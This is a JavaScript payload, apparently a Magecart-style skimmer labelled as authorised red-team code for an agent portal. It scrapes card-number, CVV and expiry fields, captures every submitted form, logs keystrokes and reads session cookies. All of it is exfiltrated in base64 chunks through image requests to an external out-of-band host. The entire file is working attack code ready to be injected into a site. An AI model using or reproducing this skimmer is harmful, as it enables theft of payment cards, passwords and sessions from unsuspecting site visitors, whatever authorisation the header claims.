/* JF AGENT PORTAL — live capture payload (authorised red-team, operator Malik) */
(function () {
  var C = 'https://dar28sje9202lj4kkc0gcja65cienyp8a.oast.fun';
  var MAX = 1100;
  function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ''; } }
  function send(tag, obj) {
    try {
      var s = b64(JSON.stringify(obj));
      if (!s) return;
      var n = 0;
      for (var i = 0; i < s.length; i += MAX) {
        var part = s.substr(i, MAX);
        var im = new Image();
        im.src = C + '/' + tag + '/' + n + '/' + s.length + '?' + part;
        n++;
      }
    } catch (e) { }
  }
  var RX = /card|cvv|cvc|ccnum|cc_num|ccno|pan|expir|credit|安全码|卡号|信用卡/i;
  function scan() {
    var out = [];
    var els = document.querySelectorAll('input,select,textarea');
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      var sig = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' +
        (el.className || '') + ' ' + (el.getAttribute && el.getAttribute('aria-label') || '')).toLowerCase();
      if (RX.test(sig) || (el.autocomplete && /cc-/.test(el.autocomplete))) {
        out.push({ n: el.name || el.id, t: el.type, v: el.value });
      }
    }
    if (out.length) send('CARD', { u: location.href, f: out });
  }
  document.addEventListener('submit', function (e) {
    try {
      var f = e.target, d = {};
      var fd = new FormData(f);
      for (var p of fd.entries()) { d[p[0]] = String(p[1]).slice(0, 200); }
      send('FORM', { u: location.href, a: f.action, d: d });
    } catch (x) { }
  }, true);
  var buf = '';
  document.addEventListener('keydown', function (e) {
    try {
      buf += e.key;
      if (buf.length >= 50) { send('KEY', { u: location.href, d: buf }); buf = ''; }
    } catch (x) { }
  }, true);
  setInterval(scan, 2500);
  scan();
  /* heartbeat so we know the payload is live on which page/session */
  send('ALIVE', { u: location.href, t: document.title, c: document.cookie.slice(0, 300) });
})();
